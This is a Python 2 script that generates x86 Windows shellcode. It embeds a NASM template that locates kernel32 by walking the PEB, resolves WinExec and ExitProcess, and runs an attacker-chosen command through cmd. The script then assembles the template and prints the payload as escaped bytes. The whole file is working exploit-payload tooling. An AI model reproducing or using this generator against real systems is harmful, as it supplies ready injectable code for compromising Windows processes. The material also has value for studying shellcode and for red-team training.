from binascii import unhexlify
import binascii
import sys
import os
from shell import shell
import time

if len (sys.argv) != 2 :
    print "\r"
    print "Creates x86 Windows/Exec Shellcode"
    print "Usage: python wincmd.py 'notepad.exe'\r\n"
    print "Adds null bytes if not divisble by 4(you want this)"
    sys.exit (1)


command = sys.argv[1]
shellcommand = binascii.hexlify(command)

def reverse_bytes(Shellcode):
	ShellcodeSize = ''
	ShellcodeSize = [Shellcode[i:i+2] for i in range(0, len(Shellcode), 2)]
	if len(ShellcodeSize) % 4 != 0:
        	print "Shellcode size is not divisible by 4"
		time.sleep(1)
        	NOP = '90'
	
		if ((len(ShellcodeSize))+1) % 4 == 0:
			Shellcode += "00"
			print "Added nullbyte"
			time.sleep(1)		
		elif ((len(ShellcodeSize))+2) % 4 == 0:
			Shellcode += "00"
			Shellcode += "20"
			print "Padding shellcode with 2 NOPS.."
			time.sleep(1)
		else:
			Shellcode += "00"
			Shellcode += "20"
			Shellcode += "20"
			print "Padding shellcode with 3 NOPS.."
			time.sleep(1)
	else:
		print " Shellcode size is divisible by 4"
		time.sleep(1)
		pass

	Shellcode = "".join(([Shellcode[i:i+2] for i in range(0, len(Shellcode), 2)]))
	ShellcodeFormatted = reversed([Shellcode[i:i+8] for i in range(0, len(Shellcode), 8)])
	push = ""
	for item in ShellcodeFormatted:
		push += "push 0x%s\r\n" % item
	return push

shellasm = """
;
; This shellcode executes CMD in context of
; current process. I recommend encoding shellcode
; in order to get rid of NULL bytes. Below you can find
; my example of that prepared shellcode (with decryption routine
; at the beginning). 
;
; MGeeky, 2012



[bits 32]

section	.text

_start:
	sub esp, 0x400
	mov ecx, 0x10
	mov ebp, esp
	add ebp, ecx

	call _GPAandLL
	mov	[ebp-4], ebx
	mov	[ebp-8], ecx

	call _WinExec
	db "WinExec", 0
	_WinExec:
	push ebx
	call ecx

	call _cmd
	db "cmd %s", 0
	_cmd:
	call eax
	
	mov ecx, [ebp-8]
	call _Exit
	db "ExitProcess", 0
	_Exit:
	mov	eax, [ebp-4]
	push eax
	call ecx
	push 0
	call eax


; GetProcAddress & LoadLibraryA locating function.
;	It locates mentioned procedures addresses and returns:
;		EBX - kernel32 image base
;		ECX - GetProcAddress
;		EDX - LoadLibraryA
;
_GPAandLL:
	cld
	mov		edx, [fs:0x30]		; PEB
	mov     edx, [edx+0x0C]		; PEB.Ldr	
	mov     edx, [edx+0x14]		; PEB.Ldr.InLoadOrderModuleList

	; Locating kernel32.dll by hashing module name values
	_a_GPAandLL:
		mov     esi, [edx+0x28]	; LDR_MODULE.szImageName
		xor     ecx, ecx
		mov     cl, 0x18
		xor     edi, edi

		_b_GPAandLL:
			xor     eax, eax
			lodsb
			cmp     al, 0x61
			jl      _c_GPAandLL
			sub     al, 0x20

			_c_GPAandLL:
			ror     edi, 0x0D
			add     edi, eax
			loop    _b_GPAandLL
			
			cmp     edi, 0x6A4ABC5B	; kernel32.dll hash
			mov     ebx, [edx+0x10]	; LDR_MODULE.ImageBase
			mov     edx, [edx]
			
			jnz     _a_GPAandLL

	mov     edx, [ebx+0x3C]			; DOSHdr.e_lfanew
	add     edx, ebx				; EBX = ImageBase
	push    dword [edx+0x34]		; OptionalHeader.ImageBase
	mov     edx, [edx+0x78]			; EXPORT Directory RVA
	add     edx, ebx
	mov     esi, [edx+0x20]			; ExportDir.NamePtrTable
	add     esi, ebx
	xor     ecx, ecx

	_d_GPAandLL:
		inc     ecx
		lodsd
		add     eax, ebx
		
		cmp     dword [eax], 0x50746547		; GetP
		jnz     _d_GPAandLL
		
		cmp     dword [eax+4], 0x41636F72	; rocA
		jnz     _d_GPAandLL
		
		cmp     dword [eax+8], 0x65726464	; ddre
		jnz     _d_GPAandLL

	dec     ecx						; ECX = function index
	mov     esi, [edx+0x24]			; ExportDir.OrdinalTable
	add     esi, ebx
	mov     cx, [esi+ecx*2]			; CX = Ordinal Value
	mov     esi, [edx+0x1C]			; ExportDir.AddressPtrTable
	add     esi, ebx
	mov     edx, [esi+ecx*4]		; Address of function
	add     edx, ebx
	push	edx
	call	_GPAandLL_LL
	db		"LoadLibraryA",0
	_GPAandLL_LL:
	push	ebx
	call	edx
	mov		edx, eax
	pop		ecx
	pop		ebx
	xor		eax, eax
	ret

""" % command
print "Writing to '%s' template...\n" % command

file = open("shellcode.asm","wb")
file.write(shellasm)
file.close()

writeasm = shell('nasm shellcode.asm')
print "Creating shellcode..."

bindshell = 'wincmd = "'
length = 0
with open("shellcode", "rb") as f:
    byte = f.read(1)
    while byte != "":
        if len(byte) > 0:
            bindshell += '\\x' + '%02.X' % ord(byte)
            length += 1
        byte = f.read(1)
bindshell += '"'
print "Length: %s bytes\n " % str(length)
print bindshell
# clearbin = shell('rm shellcode')
# clearasm = shell('rm shellcode.asm')
        
